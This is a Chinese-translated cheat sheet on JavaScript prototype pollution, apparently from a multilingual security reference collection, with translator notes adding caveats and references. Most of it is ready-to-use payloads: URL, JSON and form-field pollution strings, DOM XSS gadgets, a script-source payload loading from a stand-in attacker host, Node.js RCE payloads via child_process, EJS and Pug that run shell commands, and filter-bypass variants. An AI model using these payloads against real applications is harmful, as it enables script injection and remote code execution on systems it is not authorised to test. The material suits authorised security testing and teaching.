# 🧬 原型污染速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██████╗ ██████╗  ██████╗ ████████╗ ██████╗ ████████╗██╗   ██╗██████╗ ███████╗
  ██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██╔═══██╗╚══██╔══╝╚██╗ ██╔╝██╔══██╗██╔════╝
  ██████╔╝██████╔╝██║   ██║   ██║   ██║   ██║   ██║    ╚████╔╝ ██████╔╝█████╗  
  ██╔═══╝ ██╔══██╗██║   ██║   ██║   ██║   ██║   ██║     ╚██╔╝  ██╔═══╝ ██╔══╝  
  ██║     ██║  ██║╚██████╔╝   ██║   ╚██████╔╝   ██║      ██║   ██║     ███████╗
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝    ╚═╝      ╚═╝   ╚═╝     ╚══════╝
                 ██████╗  ██████╗ ██╗     ██╗     ██╗   ██╗████████╗██╗ ██████╗ ███╗   ██╗
                 ██╔══██╗██╔═══██╗██║     ██║     ██║   ██║╚══██╔══╝██║██╔═══██╗████╗  ██║
                 ██████╔╝██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██╔██╗ ██║
                 ██╔═══╝ ██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██║╚██╗██║
                 ██║     ╚██████╔╝███████╗███████╗╚██████╔╝   ██║   ██║╚██████╔╝██║ ╚████║
                 ╚═╝      ╚═════╝ ╚══════╝╚══════╝ ╚═════╝    ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## 🎯 什么是原型污染

**原型污染（Prototype Pollution）**是一类 JavaScript 漏洞，攻击者可借此修改 `Object.prototype`，进而影响应用中的所有对象。

> **译注：**“所有对象”是简化表述：影响取决于原型链和属性读取方式；无原型对象及同名自有属性等会改变结果。仅传入 JSON 或 URL 并不会自动污染原型，仍需存在不安全的属性写入路径；`Object.assign({},input)`通常只改变目标对象的原型，而非直接修改全局 `Object.prototype`。参见 [MDN 原型污染说明](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution)。

### 影响
- 🔴 **XSS（跨站脚本）** — 操纵 DOM
- 🔴 **RCE（远程代码执行）** — 服务端（Node.js）
- 🔴 **绕过** — 绕过安全控制
- 🔴 **DoS（拒绝服务）** — 导致应用崩溃

---

## 🔍 JavaScript 原型

### 工作原理
```javascript
// 每个对象都继承自 Object.prototype
let obj = {};
obj.__proto__ === Object.prototype  // true

// 如果污染原型：
Object.prototype.polluted = "hacked";

// 所有对象都会受到影响：
let newObj = {};
console.log(newObj.polluted);  // "hacked"
```

### 危险属性
```javascript
__proto__
constructor
prototype
```

---

## 💉 客户端载荷

### 通过 URL（查询参数／片段）
```
# 基础形式
?__proto__[polluted]=value
?__proto__.polluted=value

# 构造函数形式
?constructor[prototype][polluted]=value

# 嵌套形式
?__proto__[__proto__][polluted]=value

# URL 编码形式
?__proto__%5Bpolluted%5D=value
```

### 通过 JSON
```javascript
// 用户输入
{"__proto__": {"polluted": "value"}}
{"constructor": {"prototype": {"polluted": "value"}}}

// 嵌套形式
{"a": {"__proto__": {"polluted": "value"}}}
```

### 通过表单数据
```html
<input name="__proto__[polluted]" value="hacked">
<input name="constructor[prototype][polluted]" value="hacked">
```

---

## 🔥 利用示例

### 通过 innerHTML 触发 DOM XSS
```javascript
// 如果代码执行以下操作：
element.innerHTML = obj.html || "";

// 污染原型：
?__proto__[html]=<img src=x onerror=alert(1)>

// 结果：触发 XSS！
```

### 脚本 src 利用片段（Gadget）
```javascript
// 如果代码执行以下操作：
let script = document.createElement('script');
script.src = obj.src || '/default.js';

// 污染原型：
?__proto__[src]=data:,alert(1)//
?__proto__[src]=//attacker.com/evil.js
```

### 结合 DOM 覆盖（DOM clobbering）
```javascript
// 常见利用片段模式
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[outerHTML]=<img src=x onerror=alert(1)>
?__proto__[srcdoc]=<script>alert(1)</script>
```

### jQuery 利用片段
```javascript
// jQuery < 3.4.0
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))

// 利用
?__proto__[url]=javascript:alert(1)
```

---

> **译注：**[jQuery 3.4.0](https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/)修复了上面深合并示例中的污染问题。URL 载荷产生 XSS 还需要实际存在读取受污染属性并传入危险操作的代码片段（gadget），并非仅设置这些属性就会执行脚本。

## 🖥️ 服务端（Node.js）

> **译注：**下列 RCE 示例是依赖特定版本、调用参数和文件／模块条件的历史利用片段，不能视为通用 Node.js 行为。研究者维护的 [服务端 gadget 清单](https://github.com/KTH-LangSec/server-side-prototype-pollution)标明了多项已修复或部分修复的情况；还需先有可达的污染源。原始示例及版本注释保留供对照。

### 通过 child_process 实现 RCE
```javascript
// 如果应用调用 spawn/exec 时传入 options 对象：
const { spawn } = require('child_process');
spawn('ls', [], options);

// 污染原型：
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(1)"}}

// 或者：
{"__proto__": {"shell": true, "env": {"NODE_OPTIONS": "--require /tmp/pwn.js"}}}
```

### 通过 require() 实现 RCE
```javascript
// 污染载荷
{"__proto__": {"main": "./pwned.js"}}
```

### EJS 模板 RCE
```javascript
// EJS (< 3.1.7) RCE
{"__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');x"
}}
```

### Pug 模板 RCE
```javascript
// Pug 远程代码执行
{"__proto__": {
    "block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync('id')"
    }
}}
```

---

## 🔍 检测

### 手动测试

> **译注：**下面直接给 `Object.prototype` 赋值的控制台示例只演示继承行为；读到 `"polluted"` 本身不能证明应用存在可由外部输入触发的漏洞。应区分原型机制、应用中的污染源和实际影响，参见 [PortSwigger 原型污染介绍](https://portswigger.net/web-security/prototype-pollution)。

```javascript
// 在浏览器控制台中：
Object.prototype.testPollution = "polluted";
let obj = {};
console.log(obj.testPollution);  // 如果结果为 "polluted"，则存在漏洞

// 清理
delete Object.prototype.testPollution;
```

### URL 测试
```
# 添加到 URL 中并在控制台检查
?__proto__[test]=polluted

// 在控制台中：
({}).test  // 正常应为 undefined；如果结果为 "polluted"，则存在漏洞
```

### 查找利用片段（DOM Invader）
```
1. 安装 DOM Invader（Burp Suite）
2. 启用原型污染检测模式
3. 浏览应用
4. 检查可利用的危险操作点（sink）
```

---

> **译注：**[DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling)随 Burp 内置浏览器提供，默认关闭；上文“安装”步骤是简化说法，并非通常需要另行安装的 Burp BApp。

## 🛠️ 工具

| 工具 | 用途 |
|------|---------|
| **DOM Invader** | 用于检测原型污染的 Burp 扩展 |
| **ppfuzz** | 原型污染模糊测试工具 |
| **ppmap** | 扫描利用片段 |
| **PPScan** | 客户端扫描器 |

### ppmap 用法
```bash
# 安装
git clone https://github.com/nickvdyck/ppmap
cd ppmap

# 扫描
node ppmap.js https://target.com
```

---

## 📊 快速参考

### 载荷格式
| 格式 | 载荷 |
|--------|---------|
| 查询参数 | `?__proto__[x]=y` |
| 片段 | `#__proto__[x]=y` |
| JSON | `{"__proto__":{"x":"y"}}` |
| 合并 | `Object.assign({},input)` |

### 常见利用片段
| 属性 | 影响 |
|----------|--------|
| `innerHTML` | XSS |
| `src` | 脚本注入 |
| `href` | 重定向 |
| `shell` | RCE (Node.js) |
| `env` | RCE (Node.js) |

### 绕过技巧

> **译注：**下方 `constructor.prototype` 示例要求 `constructor` 实际引用相关构造函数；数组字面量 `["__proto__"]["polluted"]` 的赋值本身并未访问共享原型，不能单独构成污染。Unicode 写法也只有在解码及校验顺序存在差异时才可能影响过滤结果。以上是依据 [JavaScript 原型与属性访问机制](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution)对这些简化示例的解释；原代码保持不变。

```javascript
// 如果 __proto__ 被过滤：
constructor.prototype.polluted = "value"

// 不同的写法
["__proto__"]["polluted"] = "value"

// Unicode 编码
{"\u005f\u005fproto\u005f\u005f": {"x": "y"}}
```

---

## 📚 参考资料

- [PortSwigger 原型污染](https://portswigger.net/web-security/prototype-pollution)
- [服务端原型污染](https://portswigger.net/research/server-side-prototype-pollution)
- [客户端原型污染扫描器](https://github.com/nickvdyck/ppmap)

---

<p align="center">
  <b>🧬 污染原型！</b><br>
  <i>仅限经授权的测试！</i>
</p>
